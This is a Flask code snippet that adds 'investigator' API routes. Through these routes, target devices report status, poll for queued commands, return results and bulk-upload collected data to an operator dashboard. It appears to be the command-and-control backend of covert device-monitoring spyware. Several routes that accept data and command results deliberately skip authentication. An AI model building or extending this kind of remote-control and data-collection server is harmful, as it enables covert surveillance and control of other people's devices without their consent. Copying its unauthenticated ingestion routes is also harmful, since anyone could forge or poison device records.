# ADD THESE INVESTIGATOR API ROUTES TO YOUR FLASK APP

# ==================== INVESTIGATOR API IMPROVEMENTS ====================

@app.route('/api/investigator/test-connection')
def test_investigator_connection():
    """Test Investigator API connection"""
    return jsonify({
        'status': 'active',
        'message': 'Investigator API is working',
        'endpoints': {
            'verify_code': '/api/investigator/verify-code',
            'get_commands': '/api/investigator/commands',
            'send_data': '/api/investigator/data',
            'device_data': '/api/investigator/device-data/<device_id>'
        }
    })

@app.route('/api/investigator/device-status', methods=['POST'])
def update_device_status():
    """Update device status - NO AUTH REQUIRED"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        status = data.get('status')
        device_info = data.get('device_info', {})
        
        conn = get_db()
        
        # Update or create device record
        existing_device = conn.execute(
            'SELECT * FROM investigator_devices WHERE device_id = ?', 
            (device_id,)
        ).fetchone()
        
        if existing_device:
            conn.execute(
                '''UPDATE investigator_devices SET last_seen = ?, status = ? 
                WHERE device_id = ?''',
                (datetime.now(), status, device_id)
            )
        else:
            # Create new device record
            investigator_id = 1  # Default investigator
            conn.execute(
                '''INSERT INTO investigator_devices 
                (investigator_id, device_id, target_name, status, last_seen)
                VALUES (?, ?, ?, ?, ?)''',
                (investigator_id, device_id, 'Unknown Device', status, datetime.now())
            )
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Device status updated'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/investigator/command-response', methods=['POST'])
def command_response():
    """Receive command execution responses - NO AUTH REQUIRED"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        command_id = data.get('command_id')
        status = data.get('status')
        message = data.get('message')
        
        conn = get_db()
        
        # Update command status
        conn.execute(
            '''UPDATE investigator_commands SET status = ?, executed_at = ?
            WHERE id = ? AND device_id = ?''',
            (status, datetime.now(), command_id, device_id)
        )
        
        # Log the response
        conn.execute(
            '''INSERT INTO investigator_data 
            (device_id, data_type, data_content)
            VALUES (?, ?, ?)''',
            (device_id, 'command_response', json.dumps({
                'command_id': command_id,
                'status': status,
                'message': message,
                'timestamp': datetime.now().isoformat()
            }))
        )
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ==================== IMPROVED COMMAND QUEUE ====================

@app.route('/api/investigator/send-command', methods=['POST'])
def send_investigator_command():
    """Send command to device - AUTH REQUIRED"""
    if 'investigator_id' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        command_type = data.get('command_type')
        parameters = data.get('parameters', {})
        
        conn = get_db()
        
        # Verify device belongs to investigator
        device = conn.execute(
            '''SELECT * FROM investigator_devices 
            WHERE device_id = ? AND investigator_id = ?''',
            (device_id, session['investigator_id'])
        ).fetchone()
        
        if not device:
            conn.close()
            return jsonify({'error': 'Device not found or access denied'}), 404
        
        # Insert command
        cursor = conn.cursor()
        cursor.execute(
            '''INSERT INTO investigator_commands 
            (device_id, command_type, parameters, status)
            VALUES (?, ?, ?, ?)''',
            (device_id, command_type, json.dumps(parameters), 'pending')
        )
        
        command_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return jsonify({
            'status': 'success',
            'command_id': command_id,
            'message': 'Command queued for device'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ==================== DEVICE MANAGEMENT API ====================

@app.route('/api/investigator/devices/<device_id>/info')
def get_device_info(device_id):
    """Get detailed device information - AUTH REQUIRED"""
    if 'investigator_id' not in session:
        return jsonify({'error': 'Not authenticated'}), 401
    
    conn = get_db()
    
    # Verify device access
    device = conn.execute(
        '''SELECT * FROM investigator_devices 
        WHERE device_id = ? AND investigator_id = ?''',
        (device_id, session['investigator_id'])
    ).fetchone()
    
    if not device:
        conn.close()
        return jsonify({'error': 'Device not found'}), 404
    
    # Get device data
    recent_data = conn.execute(
        '''SELECT * FROM investigator_data 
        WHERE device_id = ?
        ORDER BY timestamp DESC 
        LIMIT 50''',
        (device_id,)
    ).fetchall()
    
    # Get pending commands
    pending_commands = conn.execute(
        '''SELECT * FROM investigator_commands 
        WHERE device_id = ? AND status = 'pending'
        ORDER BY created_at DESC''',
        (device_id,)
    ).fetchall()
    
    conn.close()
    
    return jsonify({
        'device': dict(device),
        'recent_data': [dict(item) for item in recent_data],
        'pending_commands': [dict(cmd) for cmd in pending_commands]
    })

# ==================== BULK DATA UPLOAD ====================

@app.route('/api/investigator/bulk-data', methods=['POST'])
def bulk_data_upload():
    """Upload multiple data items at once - NO AUTH REQUIRED"""
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        investigator_code = data.get('investigator_code')
        items = data.get('items', [])
        
        if not device_id or not investigator_code:
            return jsonify({'error': 'Device ID and investigator code required'}), 400
        
        conn = get_db()
        
        # Verify investigator code
        investigator = conn.execute(
            'SELECT * FROM investigators WHERE investigator_code = ?', 
            (investigator_code,)
        ).fetchone()
        
        if not investigator:
            conn.close()
            return jsonify({'error': 'Invalid investigator code'}), 401
        
        # Insert all data items
        for item in items:
            data_type = item.get('data_type', 'unknown')
            data_content = item.get('data_content', {})
            
            conn.execute(
                '''INSERT INTO investigator_data 
                (device_id, data_type, data_content)
                VALUES (?, ?, ?)''',
                (device_id, data_type, json.dumps(data_content))
            )
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'status': 'success', 
            'message': f'{len(items)} data items uploaded'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

print("✅ Investigator API routes added to Flask app!")
print("🔗 Available endpoints:")
print("   GET  /api/investigator/test-connection")
print("   POST /api/investigator/device-status")
print("   POST /api/investigator/command-response") 
print("   POST /api/investigator/send-command")
print("   GET  /api/investigator/devices/<device_id>/info")
print("   POST /api/investigator/bulk-data")
